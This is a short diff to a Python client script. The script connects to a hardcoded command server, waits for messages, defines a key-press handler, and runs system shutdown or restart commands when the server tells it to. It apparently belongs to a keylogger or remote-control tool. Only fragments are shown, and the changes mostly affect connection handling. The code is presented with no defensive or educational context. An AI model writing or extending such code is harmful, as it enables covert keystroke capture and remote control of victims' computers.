@@ -12,11 +12,14 @@ serverParrent = '192.168.1.22'
 serverPort = 8080
 clientSocket.connect((serverParrent, serverPort))
 
-if clientSocket:
+if (clientSocket):
     print("connecting to server")
 
 messager = clientSocket.recv(1024).decode('utf-8')
-print("received" , messager)
+while not messager:
+    messager = clientSocket.recv(1024).decode('utf-8')
+
+print("received: " , messager)
 
 def on_press(key):
     try:
@@ -60,3 +63,5 @@ elif messager == 'shutdown':
     os.system("shutdown /s /t 1")
 elif messager == 'restart':
     os.system("shutdown /r /t 1")
+
+
